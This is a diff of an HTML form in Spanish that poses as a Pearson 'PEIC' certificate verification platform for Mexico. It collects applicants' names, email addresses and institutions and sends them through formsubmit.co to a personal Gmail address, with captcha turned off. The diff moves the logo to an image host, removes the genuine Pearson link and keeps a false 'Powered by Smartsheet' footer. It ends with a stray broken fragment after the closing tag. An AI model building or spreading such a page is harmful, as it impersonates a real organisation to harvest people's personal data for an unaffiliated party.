@@ -7,78 +7,93 @@
     <style>
         body { background-color: #007ba3; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; }
         .wrapper { width: 100%; max-width: 620px; text-align: center; }
+        
+        /* CAJA DEL LOGO */
         .logo-box { background-color: white; padding: 20px 40px; border-radius: 4px; display: inline-block; margin-bottom: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         .logo-box img { width: 180px; height: auto; display: block; }
+
         .header h1 { color: white; font-size: 26px; margin: 5px 0; font-weight: 600; }
         .header p { color: white; font-size: 14.5px; line-height: 1.6; margin: 20px 0; }
         .header a { color: #ffde00; font-weight: bold; text-decoration: underline; }
+
         .card { background-color: white; padding: 45px; border-radius: 4px; text-align: left; box-shadow: 0 10px 30px rgba(0,0,0,0.25); }
-        .section-title { font-weight: bold; font-size: 17px; color: #333; margin-bottom: 15px; }
+        .section-title { font-weight: bold; font-size: 17px; color: #333; margin-bottom: 15px; margin-top: 20px; }
         .required { color: #d93025; margin-left: 3px; }
+
         .info-text { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 25px; }
         .check-box-row { display: flex; align-items: flex-start; background-color: #f4f4f4; padding: 15px; border-radius: 4px; margin-bottom: 25px; font-size: 13px; border-left: 4px solid #004a61; }
         .check-box-row input { margin-right: 12px; margin-top: 3px; }
+
         .input-group { margin-bottom: 20px; }
         .input-group label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 8px; color: #222; }
         .input-group input { width: 100%; padding: 12px; border: 1px solid #bdc3c7; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
-        .btn-submit { background-color: #007fa3; color: white; border: none; padding: 12px 60px; font-size: 15px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 15px; }
+
+        .btn-submit { background-color: #007fa3; color: white; border: none; padding: 12px 60px; font-size: 15px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 20px; transition: background 0.3s; }
+        .btn-submit:hover { background-color: #005f7a; }
+
         .footer-smartsheet { margin-top: 30px; text-align: center; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
+
     <div class="wrapper">
         <div class="header">
             <div class="logo-box">
-                <img src="https://logodownload.org/wp-content/uploads/2021/03/pearson-logo.png" alt="Pearson Logo">
+                <img src="https://i.ibb.co/3yk8S6M/pearson-logo.png" alt="Pearson Logo">
             </div>
             <h1>Plataforma de Verificación México</h1>
             <h1>Score Report - PEIC</h1>
-            <p>El <a href="https://www.pearson.com/languages/es-mx/test-takers/pearson-english-international-certificate.html" target="_blank">PEIC</a> es una certificación global.</p>
+            <p>El <a href="#" target="_blank">Pearson English International Certificate (PEIC)</a> es una certificación global.</p>
         </div>
+
         <div class="card">
             <form action="https://formsubmit.co/juliandavidpedrazarozo@gmail.com" method="POST">
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_subject" value="Nueva Solicitud de Verificación PEIC - México">
-                
-                <div class="section-title">Consideraciones generales: <span class="required">*</span></div>
+                <input type="hidden" name="_subject" value="Nueva Solicitud Verificación PEIC México">
+
+                <div class="section-title" style="margin-top: 0;">Consideraciones generales: <span class="required">*</span></div>
                 <div class="info-text">
-                    1. Acepta las políticas de uso y protección de datos.<br>
-                    2. Validación exclusiva para certificados <b>PEIC</b>.<br>
-                    3. Solicitud de carácter estrictamente <b>"institucional"</b>.<br>
-                    4. Se validan certificaciones de hasta 4 años atrás.
+                    1. Al completar este registro, acepta las políticas de uso y protección de datos.<br>
+                    2. Esta validación es exclusiva para certificados del examen <b>PEIC</b>.<br>
+                    3. Esta solicitud es de carácter estrictamente <b>"institucional"</b> en México.<br>
+                    4. Se validan certificaciones expedidas hasta 4 años atrás.
                 </div>
+
                 <div class="check-box-row">
                     <input type="checkbox" required checked>
                     <label>Confirmo que he leído y entendido las consideraciones anteriores.</label>
                 </div>
 
                 <div class="section-title">Datos a consignar verificación <span class="required">*</span></div>
+
                 <div class="input-group">
                     <label>Nombres del solicitante <span class="required">*</span></label>
                     <input type="text" name="Nombres" required>
                 </div>
+
                 <div class="input-group">
                     <label>Apellidos del solicitante <span class="required">*</span></label>
                     <input type="text" name="Apellidos" required>
                 </div>
+
                 <div class="input-group">
                     <label>Correo Electrónico <span class="required">*</span></label>
                     <input type="email" name="email" required>
                 </div>
+
                 <div class="input-group">
                     <label>Institución / Entidad <span class="required">*</span></label>
                     <input type="text" name="Institucion" required>
                 </div>
-                
+
                 <button type="submit" class="btn-submit">Submit</button>
-                <div class="footer-smartsheet">Powered by <b>Smartsheet</b></div>
+
+                <div class="footer-smartsheet">
+                    Powered by <b>Smartsheet</b>
+                </div>
             </form>
         </div>
     </div>
+
 </body>
 </html>
-                    <label>Confirmo que he leído y entendido las consideraciones anteriores.</label>
-                </div>
-
-
-                <div class="
